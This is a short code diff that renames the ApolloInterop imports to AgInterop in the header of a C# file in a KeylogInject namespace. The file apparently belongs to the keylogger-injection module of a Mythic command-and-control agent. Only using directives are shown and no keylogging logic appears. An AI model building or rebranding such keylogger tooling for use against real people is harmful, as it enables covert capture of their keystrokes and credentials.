@@ -1,18 +1,18 @@
 ﻿using System;
 using System.Text;
-using ApolloInterop.Classes.Collections;
-using ApolloInterop.Structs.ApolloStructs;
-using ApolloInterop.Serializers;
+using AgInterop.Classes.Collections;
+using AgInterop.Structs.AgCoreStructs;
+using AgInterop.Serializers;
 using ST=System.Threading.Tasks;
 using System.Threading;
 using System.Windows.Forms;
 using static KeylogInject.Native;
 using System.Collections.Concurrent;
-using ApolloInterop.Classes;
+using AgInterop.Classes;
 using System.IO.Pipes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Constants;
-using ApolloInterop.Structs.MythicStructs;
+using AgInterop.Interfaces;
+using AgInterop.Constants;
+using AgInterop.Structs.MythicStructs;
 
 namespace KeylogInject
 {
